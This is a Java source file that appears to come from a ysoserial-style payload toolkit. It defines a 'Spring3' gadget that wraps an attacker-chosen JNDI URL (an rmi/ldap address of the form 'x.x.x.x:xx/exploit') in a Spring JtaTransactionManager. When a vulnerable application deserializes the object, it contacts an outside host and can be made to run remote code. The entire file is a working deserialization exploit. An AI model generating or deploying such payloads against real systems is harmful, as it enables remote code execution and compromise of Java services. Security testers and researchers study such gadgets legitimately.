package payloads;


import org.springframework.transaction.jta.JtaTransactionManager;
import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import util.PayloadRunner;

import java.net.URL;


/**
 *
 * Spring-tx JtxTransactionManager JNDI Injection
 *
 * Command: rmi/ldap://x.x.x.x:xx/exploit
 *
 */

@Dependencies ( {"org.springframework:spring-tx:5.2.3.RELEASE","org.springframework:spring-context:5.2.3.RELEASE","javax.transaction:javax.transaction-api:1.2"} )
@Authors({ Authors.CCKUAILONG })
public class Spring3 extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject ( final String command ) throws Exception {
        JtaTransactionManager manager = new JtaTransactionManager();
        manager.setUserTransactionName(command);
        return manager;
    }

    public static byte[] getBytes (final String command, Boolean fusion) throws Exception {
        return PayloadRunner.run(Spring3.class, command, fusion);
    }
}
